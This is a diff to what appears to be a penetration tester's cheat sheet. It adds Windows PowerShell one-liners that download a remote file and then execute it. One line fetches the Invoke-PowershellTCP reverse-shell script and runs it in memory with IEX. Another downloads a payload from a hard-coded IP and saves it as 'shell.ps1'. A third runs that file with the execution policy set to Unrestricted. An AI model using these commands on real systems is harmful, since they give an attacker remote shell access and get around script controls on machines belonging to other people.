@@ -88,6 +88,15 @@ uname -m # Find linux architecture
 
 gcc -m32 1397.c -o 1398 -Wl,--hash-style=both #compile c file with 32 bit architecture with both the hash styles
 
+Downloading files on Windows using powershell:
+
 powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<>/Invoke-PowershellTCP.ps1')"
+
 Invoke-WebRequest -Uri http://<>/file -OutFile <filename>
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.190:8000/ps.ps1','C:\Users\admin\Desktop\shell.ps1')"
+
+Execute the downloaded file through powershell:
+
+powershell -ExecutionPolicy Unrestricted -File C:\Users\admin\Desktop\shell.ps1
 
